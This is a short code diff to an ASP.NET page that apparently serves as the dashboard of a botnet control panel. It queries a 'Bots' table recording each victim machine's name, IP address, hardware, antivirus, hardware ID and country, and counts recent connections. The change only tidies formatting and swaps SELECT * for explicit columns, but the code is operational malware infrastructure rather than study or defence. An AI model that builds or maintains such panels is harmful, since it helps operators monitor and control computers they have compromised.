@@ -59,7 +59,7 @@ public partial class Home : System.Web.UI.Page
             {
                 connWeek = (int)cmd.ExecuteScalar();
                 lblConnectionsWeek.Text = connWeek.ToString();
-                connWeekPre = Math.Round((double)(100 * connWeek) / connTotal , 1);
+                connWeekPre = Math.Round((double)(100 * connWeek) / connTotal, 1);
                 connWeekPrec.Text = "data-percent=\"" + connWeekPre + "\"";
             }
 
@@ -100,7 +100,7 @@ public partial class Home : System.Web.UI.Page
                 procentSyntax += "\"" + land[i] + "\" " + ":" + procent + ", ";
             }
 
-            using (SqlCommand cmd = new SqlCommand("SELECT * FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -20 , GETDATE())));", conn))
+            using (SqlCommand cmd = new SqlCommand("SELECT BotID,PCName,IP,CPU,GPU,FirstConn,LastConn,OperatingSystem,Country,Region,Antivirus,HWID,Version FROM Bots WHERE (LastConn <= convert(datetime,GETDATE())) AND (LastConn >= convert(datetime,DATEADD(second, -20 , GETDATE())));", conn))
             {
                 DataSet ds = new DataSet();
                 SqlDataReader reader = cmd.ExecuteReader();
